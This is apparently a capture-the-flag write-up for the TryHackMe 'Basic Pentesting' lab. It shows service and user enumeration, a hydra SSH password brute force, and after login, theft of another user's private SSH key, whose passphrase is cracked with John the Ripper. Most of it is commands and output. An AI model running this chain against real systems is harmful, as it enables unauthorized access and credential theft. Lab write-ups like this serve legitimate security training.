# TryHackMe - Basic Pentesting

## Service Enumeration
```
kali@kali:~$ nmap -v -T4 -sV 10.10.181.32'

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 23:47 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 23:47
Scanning 10.10.181.32 [2 ports]
Completed Ping Scan at 23:47, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:47
Completed Parallel DNS resolution of 1 host. at 23:47, 0.09s elapsed
Initiating Connect Scan at 23:47
Scanning 10.10.181.32 [1000 ports]
Discovered open port 8080/tcp on 10.10.181.32
Discovered open port 445/tcp on 10.10.181.32
Discovered open port 80/tcp on 10.10.181.32
Discovered open port 22/tcp on 10.10.181.32
Discovered open port 139/tcp on 10.10.181.32
Discovered open port 8009/tcp on 10.10.181.32
Completed Connect Scan at 23:47, 22.51s elapsed (1000 total ports)
Initiating Service scan at 23:47
Scanning 6 services on 10.10.181.32
Completed Service scan at 23:48, 11.85s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.181.32.
Initiating NSE at 23:48
Completed NSE at 23:48, 1.19s elapsed
Initiating NSE at 23:48
Completed NSE at 23:48, 1.14s elapsed
Nmap scan report for 10.10.181.32
Host is up (0.28s latency).
Not shown: 994 filtered ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.44 seconds
```

## Directory Enumeration
```
kali@kali:~$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -t 40 -u 10.10.181.32

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.32
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/09 23:51:01 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/development          (Status: 301) [Size: 318] [--> http://10.10.181.32/development/]
/server-status        (Status: 403) [Size: 300]                                       
                                                                                      
===============================================================
2021/05/09 23:53:32 Finished
===============================================================
```

## Username Enumeration
```
kali@kali:~$ enum4linux 10.10.181.32
....
....
 ======================================================================= 
|    Users on 10.10.181.32 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
....
....
```

## SSH Password Bruteforce
```
kali@kali:~$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.181.32:22 -t 40 -R

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[INFORMATION] reading restore file ./hydra.restore
[WARNING] options after -R are now honored (since v8.6)
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-10 01:33:35
[DATA] max 40 tasks per 1 server, overall 40 tasks, 14344399 login tries (l:1/p:14344399), ~358610 tries per task
[DATA] attacking ssh://10.10.181.32:22/
[STATUS] 649.00 tries/min, 649 tries in 00:01h, 14343781 to do in 368:22h, 40 active
[22][ssh] host: 10.10.181.32   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 35 final worker threads did not complete until end.
[ERROR] 35 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-10 01:35:19
```

## Getting into the machine
```
kali@kali:~$ ssh jan@10.10.181.32                           
The authenticity of host '10.10.181.32 (10.10.181.32)' can't be established.
ECDSA key fingerprint is SHA256:+Fk53V/LB+2pn4OPL7GN/DuVHVvO0lT9N4W5ifchySQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.181.32' (ECDSA) to the list of known hosts.
jan@10.10.181.32's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
                                                                                                                                                             
 * Documentation:  https://help.ubuntu.com                                                                                                                   
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ 
```

## Escalating Privileges

Uploaded linpeas.sh from my local machine to victim machine by using scp.
`kali@kali:~$ scp ./linpeas.sh jan@10.10.181.32:/tmp/`

Run linpeas.sh in victim machine to find privilege escalation vectors.
`jan@basic2:~$ chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh`

Found a ssh private key stored in `/home/kay/.ssh/id_rsa`.
Copied it to local machine and passed through ssh2john and then JohnTheRipper.
```
kali@kali:~$ ./ssh2john kay_ssh_private_key.txt > kay_john.txt
kali@kali:~$ john kay_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_private_key)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2021-05-10 09:03) 0.1353g/s 1940Kp/s 1940Kc/s 1940KC/sa6_123..*7Â¡Vamos!

```
